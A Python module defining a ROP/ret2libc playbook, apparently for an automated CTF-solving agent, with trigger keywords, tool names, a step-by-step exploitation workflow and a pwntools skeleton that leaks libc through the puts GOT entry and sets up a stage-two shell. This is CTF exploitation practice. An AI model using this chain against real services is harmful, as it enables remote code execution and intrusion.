"""pwn_rop playbook — ROP / ret2libc (GREYCTF 'elite-ball' pattern)."""

from . import Playbook

PLAYBOOK = Playbook(
    name="pwn_rop",
    category="pwn",
    triggers=("rop", "ret2libc", "buffer overflow", "stack", "gadget", "one_gadget",
              "libc", "pwn", "overflow", "ret2", "canary", "pie", "nx", "elite", "ball"),
    tools=("run_pwntools", "run_ropgadget", "run_one_gadget", "run_libc_lookup",
           "gdb_start", "run_patchelf", "run_seccomp_tools"),
    workflow=(
        "1. checksec the binary (mitigations: NX, PIE, canary, RELRO).\n"
        "2. Find the overflow offset (cyclic pattern via gdb_start / pwntools).\n"
        "3. If libc is given: run pwninit; identify it with run_libc_lookup (leak offsets).\n"
        "4. Build the chain: leak a libc address (puts/printf got), return to main,\n"
        "   resolve system/one_gadget, second stage to shell.\n"
        "   - run_ropgadget for gadgets; run_one_gadget for magic RCE offsets.\n"
        "5. If seccomp present (run_seccomp_tools), use ORW ropchain instead of execve.\n"
        "6. Develop locally with run_pwntools / gdb_start, then point at the remote."
    ),
    skeleton=(
        "from pwn import *\n"
        "context.binary = elf = ELF('/workspace/chal')\n"
        "libc = ELF('/workspace/libc.so.6')\n"
        "p = process(elf.path)        # or remote(HOST, PORT)\n"
        "OFFSET = 0  # find with cyclic()/gdb\n"
        "rop = ROP(elf)\n"
        "rop.raw(rop.ret)             # stack-align\n"
        "rop.puts(elf.got['puts'])\n"
        "rop.call(elf.symbols['main'])\n"
        "p.sendlineafter(b'> ', b'A'*OFFSET + rop.chain())\n"
        "leak = u64(p.recvline().strip().ljust(8, b'\\x00'))\n"
        "libc.address = leak - libc.symbols['puts']\n"
        "log.success(f'libc base = {hex(libc.address)}')\n"
        "# stage 2: one_gadget or system('/bin/sh')\n"
    ),
)
